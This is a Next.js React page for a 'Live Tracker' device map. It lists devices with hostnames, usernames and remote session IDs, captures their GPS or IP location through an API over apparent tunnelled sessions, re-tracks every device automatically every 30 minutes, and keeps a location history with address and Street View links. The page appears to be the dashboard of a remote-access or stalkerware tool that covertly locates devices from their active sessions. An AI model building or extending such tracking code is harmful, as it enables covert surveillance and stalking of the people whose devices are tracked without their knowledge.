"use client";

import { useEffect, useState, useCallback, useRef } from "react";
import dynamic from "next/dynamic";
import { supabase, type Device } from "@/lib/supabase";
import type { StoredLocation } from "@/lib/geolocation";
import { useToast } from "@/components/toast";

// Leaflet must be dynamic (no SSR)
const MapView = dynamic(() => import("@/components/map-view"), { ssr: false, loading: () => (
  <div className="flex h-full items-center justify-center bg-[#050508]">
    <div className="text-center space-y-2">
      <span className="h-6 w-6 animate-spin rounded-full border border-slate-700 border-t-green-500 block mx-auto" />
      <p className="text-[10px] uppercase tracking-wider text-slate-600">Loading map...</p>
    </div>
  </div>
)});

export type DevicePin = {
  device: Device;
  location: StoredLocation;
};

export default function MapPage() {
  const [pins, setPins] = useState<DevicePin[]>([]);
  const [selected, setSelected] = useState<DevicePin | null>(null);
  const [history, setHistory] = useState<StoredLocation[]>([]);
  const [tracking, setTracking] = useState(false);
  const [lastTrack, setLastTrack] = useState<Date | null>(null);
  const [totalDevices, setTotalDevices] = useState(0);
  const [view, setView] = useState<"map" | "satellite">("map");
  const { toast } = useToast();
  const trackTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // ── Load latest locations ───────────────────────────────────
  const load = useCallback(async () => {
    const [locRes, devRes] = await Promise.all([
      fetch("/api/location").then((r) => r.json()),
      supabase.from("devices").select("*"),
    ]);

    const locations: StoredLocation[] = locRes.locations ?? [];
    const devices: Device[] = devRes.data ?? [];
    setTotalDevices(devices.length);

    const merged: DevicePin[] = [];
    for (const loc of locations) {
      const dev = devices.find((d) => d.id === loc.device_id);
      if (dev) merged.push({ device: dev, location: loc });
    }
    setPins(merged);
  }, []);

  // ── Track all sessions ──────────────────────────────────────
  const trackAll = useCallback(async () => {
    setTracking(true);
    try {
      const res = await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "track_all" }),
      }).then((r) => r.json());

      if (res.captured > 0) {
        toast(`${res.captured}/${res.total} sessions located`, "success");
        await load();
      } else if (res.total === 0) {
        toast("No active sessions to track", "warning");
      } else {
        toast("Sessions found but location unavailable (try Android sessions for GPS)", "warning");
      }
      setLastTrack(new Date());
    } catch {
      toast("Tracking failed", "error");
    } finally {
      setTracking(false);
    }
  }, [load, toast]);

  // ── Load history for selected device ───────────────────────
  const loadHistory = useCallback(async (deviceId: string) => {
    const res = await fetch(`/api/location?device=${deviceId}&limit=50`).then((r) => r.json());
    setHistory(res.locations ?? []);
  }, []);

  // ── Initial load ────────────────────────────────────────────
  useEffect(() => { load(); }, [load]);

  // ── Auto-track every 30 minutes ─────────────────────────────
  useEffect(() => {
    trackTimerRef.current = setInterval(() => {
      trackAll();
    }, 30 * 60 * 1000);
    return () => {
      if (trackTimerRef.current) clearInterval(trackTimerRef.current);
    };
  }, [trackAll]);

  // ── Real-time: new location captured ─────────────────────────
  useEffect(() => {
    const ch = supabase.channel("locations-rt")
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "locations" }, async (payload) => {
        const loc = payload.new as StoredLocation;
        const { data: dev } = await supabase.from("devices").select("*").eq("id", loc.device_id).single();
        if (dev) {
          setPins((prev) => {
            const filtered = prev.filter((p) => p.device.id !== loc.device_id);
            return [...filtered, { device: dev as Device, location: loc }];
          });
          toast(`📍 ${(dev as Device).hostname ?? "Device"} moved → ${loc.city ?? "unknown location"}`, "success");
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(ch); };
  }, [toast]);

  const handleSelectPin = useCallback(async (pin: DevicePin) => {
    setSelected(pin);
    await loadHistory(pin.device.id);
  }, [loadHistory]);

  const nextTrackIn = lastTrack
    ? Math.max(0, 30 - Math.floor((Date.now() - lastTrack.getTime()) / 60000))
    : null;

  return (
    <div className="flex h-full flex-col overflow-hidden" style={{ height: "calc(100vh - 56px)" }}>
      {/* ── Top bar ─────────────────────────────────────────── */}
      <div className="flex shrink-0 items-center justify-between border-b border-white/[0.05] bg-[#06060f] px-5 py-3">
        <div className="flex items-center gap-4">
          <div>
            <p className="text-[9px] font-semibold uppercase tracking-[0.2em] text-slate-600">Live Tracker</p>
            <p className="text-[13px] font-bold text-white">Device Map</p>
          </div>
          <div className="flex items-center gap-3 text-[10px]">
            <span className="rounded border border-green-900/40 bg-green-950/20 px-2 py-0.5 text-green-400 font-mono">
              {pins.length} located
            </span>
            <span className="text-slate-600">/</span>
            <span className="text-slate-500">{totalDevices} total devices</span>
          </div>
        </div>

        <div className="flex items-center gap-2">
          {/* Layer toggle */}
          <div className="flex rounded border border-white/[0.06] overflow-hidden">
            {(["map", "satellite"] as const).map((v) => (
              <button key={v} type="button" onClick={() => setView(v)}
                className={`px-3 py-1.5 text-[9px] uppercase tracking-wider transition ${
                  view === v
                    ? "bg-white/[0.08] text-slate-200"
                    : "text-slate-600 hover:text-slate-400"
                }`}>
                {v}
              </button>
            ))}
          </div>

          {/* Manual track */}
          <button type="button" onClick={trackAll} disabled={tracking}
            className="flex items-center gap-1.5 rounded border border-red-800/50 bg-red-950/20 px-3 py-1.5 text-[10px] font-semibold uppercase tracking-wider text-red-400 transition hover:bg-red-950/40 disabled:opacity-40">
            {tracking ? (
              <span className="h-2.5 w-2.5 animate-spin rounded-full border border-red-700 border-t-red-400" />
            ) : (
              <span className="h-2 w-2 rounded-full bg-red-500 status-pulse" />
            )}
            {tracking ? "Locating..." : "Track All Now"}
          </button>

          {nextTrackIn !== null && (
            <span className="text-[9px] text-slate-700">Next auto: {nextTrackIn}m</span>
          )}
        </div>
      </div>

      {/* ── Main content ─────────────────────────────────────── */}
      <div className="flex flex-1 overflow-hidden">
        {/* Map */}
        <div className="relative flex-1">
          <MapView
            pins={pins}
            selected={selected}
            onSelectPin={handleSelectPin}
            tileLayer={view}
          />

          {/* No locations overlay */}
          {pins.length === 0 && !tracking && (
            <div className="pointer-events-none absolute inset-0 flex items-center justify-center">
              <div className="rounded border border-white/[0.05] bg-black/70 px-6 py-4 text-center backdrop-blur-sm">
                <p className="text-[11px] text-slate-400">No device locations yet</p>
                <p className="mt-1 text-[9px] text-slate-600">
                  Click "Track All Now" to capture GPS from active sessions
                </p>
              </div>
            </div>
          )}
        </div>

        {/* ── Side panel ────────────────────────────────────── */}
        <div className="w-80 shrink-0 border-l border-white/[0.05] bg-[#06060f] flex flex-col overflow-hidden">
          {!selected ? (
            <div className="flex h-full items-center justify-center">
              <p className="text-[10px] uppercase tracking-wider text-slate-700">Click a device pin</p>
            </div>
          ) : (
            <>
              {/* Device header */}
              <div className="shrink-0 border-b border-white/[0.05] p-4 space-y-3">
                <div className="flex items-start justify-between">
                  <div>
                    <p className="font-mono text-[13px] font-bold text-slate-100">
                      {selected.device.hostname ?? "Unknown"}
                    </p>
                    <p className="text-[10px] text-slate-500 mt-0.5">
                      {selected.device.platform} · {selected.device.username ?? "?"}
                    </p>
                  </div>
                  <span className={`h-2 w-2 rounded-full mt-1.5 ${selected.device.is_active ? "bg-green-500 status-pulse" : "bg-slate-700"}`} />
                </div>

                {/* Coords */}
                <div className="rounded border border-white/[0.05] bg-black/30 px-3 py-2 space-y-1">
                  <div className="flex justify-between">
                    <span className="text-[9px] uppercase text-slate-600">Latitude</span>
                    <span className="font-mono text-[10px] text-green-400">{selected.location.lat.toFixed(6)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[9px] uppercase text-slate-600">Longitude</span>
                    <span className="font-mono text-[10px] text-green-400">{selected.location.lng.toFixed(6)}</span>
                  </div>
                  {selected.location.accuracy && (
                    <div className="flex justify-between">
                      <span className="text-[9px] uppercase text-slate-600">Accuracy</span>
                      <span className="font-mono text-[10px] text-slate-400">{selected.location.accuracy.toFixed(0)} m</span>
                    </div>
                  )}
                  <div className="flex justify-between">
                    <span className="text-[9px] uppercase text-slate-600">Source</span>
                    <span className={`font-mono text-[10px] ${selected.location.source === "gps" ? "text-green-400" : selected.location.source === "ip" ? "text-amber-400" : "text-slate-400"}`}>
                      {selected.location.source.toUpperCase()}
                    </span>
                  </div>
                </div>

                {/* Address */}
                {selected.location.address && (
                  <p className="text-[10px] text-slate-500 leading-relaxed">
                    📍 {selected.location.address}
                  </p>
                )}

                {/* Action buttons */}
                <div className="flex gap-1.5">
                  <a
                    href={`https://maps.google.com/maps?q=${selected.location.lat},${selected.location.lng}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex-1 rounded border border-blue-900/40 bg-blue-950/20 py-1.5 text-center text-[9px] font-semibold uppercase tracking-wider text-blue-400 transition hover:bg-blue-950/40"
                  >
                    Google Maps
                  </a>
                  <a
                    href={`https://maps.google.com/maps?q=&layer=c&cbll=${selected.location.lat},${selected.location.lng}&cbp=12,0,0,0,0`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex-1 rounded border border-cyan-900/40 bg-cyan-950/20 py-1.5 text-center text-[9px] font-semibold uppercase tracking-wider text-cyan-400 transition hover:bg-cyan-950/40"
                  >
                    Street View
                  </a>
                </div>

                {/* Geolocate button */}
                <button
                  type="button"
                  onClick={async () => {
                    if (!selected.device.session_id) return;
                    setTracking(true);
                    try {
                      const res = await fetch("/api/location", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                          sessionId: selected.device.session_id,
                          deviceId: selected.device.id,
                          tunnelIp: selected.device.tunnel?.split(":")?.[0],
                          sessionType: selected.device.platform,
                        }),
                      }).then((r) => r.json());
                      if (res.ok) {
                        toast(`Location updated: ${res.location?.address ?? "captured"}`, "success");
                        await load();
                        await loadHistory(selected.device.id);
                      } else {
                        toast(res.message ?? "Location unavailable", "warning");
                      }
                    } catch {
                      toast("Capture failed", "error");
                    } finally {
                      setTracking(false);
                    }
                  }}
                  disabled={tracking || !selected.device.session_id || !selected.device.is_active}
                  className="w-full rounded border border-red-800/50 bg-red-950/20 py-2 text-[10px] font-semibold uppercase tracking-wider text-red-400 transition hover:bg-red-950/40 disabled:opacity-30"
                >
                  {tracking ? "Capturing..." : "📡 Capture Now"}
                </button>
              </div>

              {/* Location history */}
              <div className="flex-1 overflow-y-auto">
                <p className="px-4 py-2 text-[9px] font-semibold uppercase tracking-widest text-slate-600">
                  Location History ({history.length})
                </p>
                {history.length === 0 ? (
                  <p className="px-4 py-6 text-center text-[10px] text-slate-700">No history yet</p>
                ) : (
                  history.map((loc, i) => (
                    <div key={loc.id} className="border-b border-white/[0.03] px-4 py-2.5 hover:bg-white/[0.02] transition">
                      <div className="flex items-start justify-between gap-2">
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-1.5">
                            {i === 0 && <span className="h-1.5 w-1.5 rounded-full bg-green-500 status-pulse shrink-0" />}
                            <span className="font-mono text-[10px] text-slate-300 truncate">
                              {loc.lat.toFixed(5)}, {loc.lng.toFixed(5)}
                            </span>
                          </div>
                          {loc.address && (
                            <p className="mt-0.5 text-[9px] text-slate-600 truncate">{loc.address}</p>
                          )}
                        </div>
                        <span className={`shrink-0 rounded border px-1 py-px text-[8px] font-bold ${
                          loc.source === "gps" ? "border-green-900/40 text-green-500" : "border-amber-900/40 text-amber-500"
                        }`}>{loc.source}</span>
                      </div>
                      <p className="mt-0.5 text-[9px] text-slate-700">
                        {new Date(loc.captured_at).toLocaleString("en-US", {
                          month: "short", day: "numeric",
                          hour: "2-digit", minute: "2-digit", second: "2-digit",
                        })}
                      </p>
                    </div>
                  ))
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
